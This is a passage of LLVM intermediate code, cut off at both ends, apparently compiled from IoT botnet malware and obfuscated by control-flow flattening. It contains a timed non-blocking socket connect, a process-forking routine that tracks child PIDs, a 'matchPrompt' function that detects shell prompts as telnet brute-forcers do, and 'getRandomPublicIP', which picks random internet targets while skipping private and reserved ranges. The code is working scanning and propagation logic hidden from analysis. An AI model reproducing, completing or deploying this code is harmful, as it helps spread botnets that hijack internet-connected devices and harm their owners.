; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1805294106, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 651133541, i32 -104119734
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #10
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 1032702103, i32 1090592909
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 1235860826, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 99374029, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 1967117634, i32 -1326544605
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #5
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 241282720, i32 -1776832966
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1805294106, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 620792930, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1805294106, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -884661721, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1805294106, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -104119734, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -1805294106, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 690253889, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 690253889, label %first
    i32 509666393, label %9
    i32 388340516, label %11
    i32 311187231, label %19
    i32 1244940265, label %26
    i32 716300459, label %36
    i32 1504248297, label %39
    i32 -1388399171, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 509666393, i32 388340516
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1388399171, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #5
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 311187231, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 1244940265, i32 1504248297
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 716300459, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 311187231, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #5
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -1388399171, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.262, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -541317240, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -541317240, label %11
    i32 1705847214, label %18
    i32 -188438179, label %19
    i32 434604308, label %24
    i32 869901925, label %37
    i32 1991281492, label %50
    i32 -283953558, label %63
    i32 -1912939612, label %75
    i32 2051603850, label %76
    i32 -1765076620, label %78
    i32 -1615322773, label %81
    i32 1183092271, label %100
    i32 -214634549, label %101
    i32 -1157887430, label %102
    i32 -678093715, label %105
    i32 -1462363349, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 1705847214, i32 -678093715
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -188438179, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 434604308, i32 2051603850
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -1912939612, i32 869901925
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -1912939612, i32 1991281492
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -1912939612, i32 -283953558
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -1912939612, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 2051603850, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -1765076620, i32 -1615322773
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -188438179, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 1183092271, i32 -214634549
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1462363349, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -1157887430, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -541317240, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1462363349, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 414727712, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 414727712, label %14
    i32 -1477493333, label %19
    i32 462147572, label %24
    i32 -423928350, label %29
    i32 -295640469, label %34
    i32 -1193118238, label %39
    i32 -1870134682, label %44
    i32 -1051327315, label %49
    i32 -1896888077, label %54
    i32 203121440, label %59
    i32 -1475832578, label %64
    i32 1107847122, label %69
    i32 -256861518, label %74
    i32 1460429713, label %79
    i32 -1194434912, label %84
    i32 1006664006, label %89
    i32 777427603, label %94
    i32 1822866414, label %99
    i32 301918098, label %104
    i32 1791858202, label %109
    i32 -2103055007, label %114
    i32 629726267, label %119
    i32 1947288146, label %124
    i32 428822779, label %129
    i32 -508031840, label %134
    i32 1720784802, label %139
    i32 -779536509, label %144
    i32 -2018008945, label %149
    i32 535514614, label %154
    i32 2053410497, label %158
    i32 1528289046, label %160
    i32 -980326262, label %173
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  %18 = select i1 %17, i32 2053410497, i32 -1477493333
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 10
  %23 = select i1 %22, i32 2053410497, i32 462147572
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 100
  %28 = select i1 %27, i32 -423928350, i32 -1193118238
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp sge i32 %31, 64
  %33 = select i1 %32, i32 -295640469, i32 -1193118238
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp sle i32 %36, 127
  %38 = select i1 %37, i32 2053410497, i32 -1193118238
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 127
  %43 = select i1 %42, i32 2053410497, i32 -1870134682
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 169
  %48 = select i1 %47, i32 -1051327315, i32 -1896888077
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 254
  %53 = select i1 %52, i32 2053410497, i32 -1896888077
  store i32 %53, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 172
  %58 = select i1 %57, i32 203121440, i32 1107847122
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp sle i32 %61, 16
  %63 = select i1 %62, i32 -1475832578, i32 1107847122
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sle i32 %66, 31
  %68 = select i1 %67, i32 2053410497, i32 1107847122
  store i32 %68, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 192
  %73 = select i1 %72, i32 -256861518, i32 -1194434912
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 0
  %78 = select i1 %77, i32 1460429713, i32 -1194434912
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 2
  %83 = select i1 %82, i32 2053410497, i32 -1194434912
  store i32 %83, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 192
  %88 = select i1 %87, i32 1006664006, i32 1822866414
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 88
  %93 = select i1 %92, i32 777427603, i32 1822866414
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 99
  %98 = select i1 %97, i32 2053410497, i32 1822866414
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 192
  %103 = select i1 %102, i32 301918098, i32 1791858202
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 168
  %108 = select i1 %107, i32 2053410497, i32 1791858202
  store i32 %108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 198
  %113 = select i1 %112, i32 -2103055007, i32 1947288146
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 18
  %118 = select i1 %117, i32 2053410497, i32 629726267
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 19
  %123 = select i1 %122, i32 2053410497, i32 1947288146
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 198
  %128 = select i1 %127, i32 428822779, i32 1720784802
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 51
  %133 = select i1 %132, i32 -508031840, i32 1720784802
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 100
  %138 = select i1 %137, i32 2053410497, i32 1720784802
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 203
  %143 = select i1 %142, i32 -779536509, i32 535514614
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 -2018008945, i32 535514614
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 113
  %153 = select i1 %152, i32 2053410497, i32 535514614
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp sge i32 %156, 224
  store i32 2053410497, i32* %switchVar
  store i1 %157, i1* %.reg2mem
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %159 = select i1 %.reload, i32 1528289046, i32 -980326262
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 223
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %167 = call i32 @rand() #5
  %168 = srem i32 %167, 255
